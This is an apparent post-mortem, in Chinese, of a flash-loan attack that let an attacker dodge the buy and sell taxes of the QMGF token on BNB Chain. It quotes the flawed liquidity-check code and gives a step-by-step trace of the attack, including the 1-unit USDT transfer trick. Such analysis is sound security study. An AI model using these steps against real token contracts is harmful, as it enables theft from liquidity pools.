# 情况简介

QMGF 合约地址 [0xf193d0762CEc3667c8d699dD13E4DD0310613333](https://bscscan.com/address/0xf193d0762cec3667c8d699dd13e4dd0310613333)

USDT 合约地址 [0x55d398326f99059ff775485246999027b3197955](https://bscscan.com/address/0x55d398326f99059ff775485246999027b3197955)

pancake池子合约 [0x455598039bc8aa9605b475c1d45ff8275421a166](https://bscscan.com/address/0x455598039bc8aa9605b475c1d45ff8275421a166)

> QMGF 买税 6% 卖税 6 % 其他地址互相转账不收税 

攻击hash [0x58eec5919083576ea79b0c37efd89161359f1098e037cd243df29a78ad2fa86d](https://bscscan.com/tx/0x58eec5919083576ea79b0c37efd89161359f1098e037cd243df29a78ad2fa86d) 

> 通过 两次闪电贷 跳过 QMGF 的买卖税  实现盈利

hash链接(其他区块浏览器)

https://dashboard.tenderly.co/tx/binance/0x58eec5919083576ea79b0c37efd89161359f1098e037cd243df29a78ad2fa86d

https://explorer.phalcon.xyz/tx/bsc/0x58eec5919083576ea79b0c37efd89161359f1098e037cd243df29a78ad2fa86d

https://openchain.xyz/trace/binance/0x58eec5919083576ea79b0c37efd89161359f1098e037cd243df29a78ad2fa86d

攻击合约 [0x37540e0C57C2e7b551ff7fF7597d94bb26d6dAc1](https://bscscan.com/address/0x37540e0c57c2e7b551ff7ff7597d94bb26d6dac1)

![资金转移情况](https://github.com/okeyzero/Blockchain/assets/48344256/dcd85095-7dc3-45b1-8161-f1063c00e0f0)

# 开始分析

1. ###### 从 [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d](https://bscscan.com/address/0x81917eb96b397dfb1c6000d28a5bc08c0f05fc1d) 借贷  280000 USDT 

```javascript
flashLoan
input:{
  "baseAmount": "0",
  "quoteAmount": "280000000000000000000000",
  "assetTo": "0x37540e0c57c2e7b551ff7ff7597d94bb26d6dac1",
  "data": "0x000000000000000000000000000000000000000000001969368974c05b0000000000000000000000000000000000000000000000000000000000000000000000"
}
```

2. ###### 计算可以购买的数量，从pancake池子借贷QMGF 并使用 USDT 归还此次借贷

   计算  120000USDT  可以购买到 15140.285057231349336434 QMGF

```javascript
getReserves
    output:{
      "reserve0": "79245518537801509432539",
      "reserve1": "25163674699423714257258",
      "blockTimestampLast": 1688555409
    }
->
getAmountOut
    input{
      "amountIn": "120000000000000000000000",
      "reserveIn": "79245518537801509432539",
      "reserveOut": "25163674699423714257258"
    }
    output{
      "amountOut": "15140285057231349336434"
    }
->	
swap 借贷
    input{
      "amount0Out": "0",
      "amount1Out": "15140285057231349336434",
      "to": "0x37540e0c57c2e7b551ff7ff7597d94bb26d6dac1",
      "data": "0x000000000000000000000000000000000000000000001969368974c05b000000"
    }
```

在QMGF合约代币转移的过程中 不对池子收税 ，对其他人收税的代码片段如下 

```javascript
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            _basicTransfer(from, to, amount);
            return;
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= _swapTokensAtAmount;

        if (
            canSwap &&
            from != address(this) &&
            from != _uniswapV2Pair &&
            from != owner() &&
            to != owner() &&
            _startTimeForSwap > 0 &&
            !_isAddLiquidity() &&
            to == _uniswapV2Pair
        ) {
            transferSwap(contractTokenBalance);
        } 
            
		//swapTokensForDead 是 判断 _marketRouter 的USDT 数量 大于500 U 则调用swap 调用pancake 购买 QMGF (接收地址地址黑洞)
        if(from != _uniswapV2Pair && to != _uniswapV2Pair){
             swapTokensForDead();
        }

            
        if (
            (_startTimeForSwap + _intervalSecondsForSwap > block.timestamp &&
                from == _uniswapV2Pair) ||
            (tx.gasprice > _setGas &&
                (from == _uniswapV2Pair || to == _uniswapV2Pair)) ||
            _isBot[from]
        ) {
            //拉黑操作 无视
            amount = takeBot(from, amount);
        } else {
            if (
                !_isRemoveLiquidity() &&
                getBuyFee() > 0 &&
                from == _uniswapV2Pair
            ) {
                //buy
                amount = takeBuy(from, amount);
            } else if (
                !_isAddLiquidity() && getSellFee() > 0 && to == _uniswapV2Pair
            ) {
                //sell
                amount = takeSell(from, amount);
            }
        }


        _basicTransfer(from, to, amount);
        takeNFTDivi();
        if (_fromAddress == address(0)) _fromAddress = from;
        if (_toAddress == address(0)) _toAddress = to;
        if (!_isDividendExempt[_fromAddress] && _fromAddress != _uniswapV2Pair)
            setShare(_fromAddress);
        if (!_isDividendExempt[_toAddress] && _toAddress != _uniswapV2Pair)
            setShare(_toAddress);

        _fromAddress = from;
        _toAddress = to;
        uint256 lpBal = IERC20(_token).balanceOf(_lpRouter);

        if (
            lpBal > 0 &&
            _buyLpFee.add(_sellLpFee) > 0 &&
            from != address(this) &&
            _lpDiv.add(_minPeriod) <= block.timestamp
        ) {
            process(_distributorGas);
            _lpDiv = block.timestamp;
        }
    }

    function _basicTransfer( //简单的转账 
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _tOwned[sender] = _tOwned[sender].sub(amount, "Insufficient Balance");
        _tOwned[recipient] = _tOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
	
	function _isAddLiquidity() internal view returns (bool isAdd) {
        IUniswapV2Pair mainPair = IUniswapV2Pair(_uniswapV2Pair);
        (uint256 r0, uint256 r1, ) = mainPair.getReserves();

        address tokenOther = _token;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint256 bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove) {
        IUniswapV2Pair mainPair = IUniswapV2Pair(_uniswapV2Pair);
        (uint256 r0, uint256 r1, ) = mainPair.getReserves();

        address tokenOther = _token;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint256 bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }

```

接下来 从 pancake 池子地址(0x455598039bc8aa9605b475c1d45ff8275421a166) 转移 15140285057231349336434 单位的 QMGF 其中 本次转移的 详情如下

可知 

from 为 0x455598039bc8aa9605b475c1d45ff8275421a166 

to为 0x37540e0c57c2e7b551ff7ff7597d94bb26d6dac1

不满足 上方 buy 和 sell 的任何一条 实现免税

```javascript
{
  "[FUNCTION]": "_transfer",
  "[OPCODE]": "JUMP",
  "contract": {
    "address": "0xf193d0762cec3667c8d699dd13e4dd0310613333"
  },
  "caller": {
    "address": "0x455598039bc8aa9605b475c1d45ff8275421a166",
    "balance": "0"
  },
  "input": {
    "from": "0x455598039bc8aa9605b475c1d45ff8275421a166",
    "to": "0x37540e0c57c2e7b551ff7ff7597d94bb26d6dac1",
    "amount": "15140285057231349336434"
  },
  "output": {},
  "gas": {
    "gas_left": 1667312,
    "gas_used": 584544,
    "total_gas_used": 1142351
  }
}
-----------------------------------------------------------------------------------------
其中 在 _isRemoveLiquidity 的判断中
此时 getReserves
{
  "reserve0": "79245518537801509432539",
  "reserve1": "25163674699423714257258",
  "blockTimestampLast": 1688555409
}
也就是 r0 = 79245518537801509432539  ,r1 = 25163674699423714257258
tokenOther 为 USDT 其 池子中的 余额为 79245.518537801509432539 USDT
很明显  
r = 79245518537801509432539
bal= 79245518537801509432539
满足 isRemove = r >= bal的条件 所以返回 true
-----------------------------------------------------------------------------------------
在 _isAddLiquidity 的判断中
bal 和 r 和 _isRemoveLiquidity 一样 不满足 isAdd = bal > r 的条件 所以返回值为 false

至此 本次 QMGF的转移 并未收税
```

然后 攻击合约  归还 120000 USDT 注意 归还的 不是贷款的 QMGF 

归还后 此时 池子有 199245.518537801509432539 USDT 和 10023.389642192364920824 QMGF
 _marketRouter 有 549.403211927398787353 USDT

3. ###### 攻击合约 自己给自己转移1单位QMGF 

攻击合约 (0x37540e0c57c2e7b551ff7ff7597d94bb26d6dac1)转移给攻击合约(0x37540e0c57c2e7b551ff7ff7597d94bb26d6dac1)自己 1 单位的 QMGF，这一步的目的是为了 满足swapTokensForDead 的条件

swapTokensForDead swap 的时候
池子有 199745.518537801509432539 USDT 和 9998.361812254419280823 QMGF



4. ###### 攻击合约 转移给pancake池子 1单位的USDT

swapTokensForDead 完后

攻击合约 有 15140.285057231349336434 QMGF 授权给pancake之后
攻击合约 转移给 池子 1单位的 USDT 这一步的目的是为了 在接下来的卖出环节中 不满足 _isAddLiquidity 的条件

转移1单位的 USDT 后 攻击合约卖出  15140.285057231349336434 QMGF 

在其中的转移 QMGF  的过程中 的 sell 条件判断中getSellFee() > 0 和 to == _uniswapV2Pair 都是满足的 而转移1单位的USDT造成了 _isAddLiquidity 的无法满足 所以跳过收税

```javascript
在 _isAddLiquidity 的判断中
此时 getReserves
{
  "reserve0": "199745518537801509432539",
  "reserve1": "9998361812254419280823",
  "blockTimestampLast": 1688556147
}
也就是 r0 = 199745518537801509432539  ,r1 = 9998361812254419280823
tokenOther 为 USDT 其 池子中的 余额为 199745.51853780150943254 USDT
很明显  
r = 199745518537801509432539
bal= 199745518537801509432540
不满足 isAdd = bal > r 的条件 所以返回 false
```

5. ###### 归还280000USDT 攻击完成

至此 攻击核心完成，接下来，就是归还 280000USDT 后，攻击就完成了。
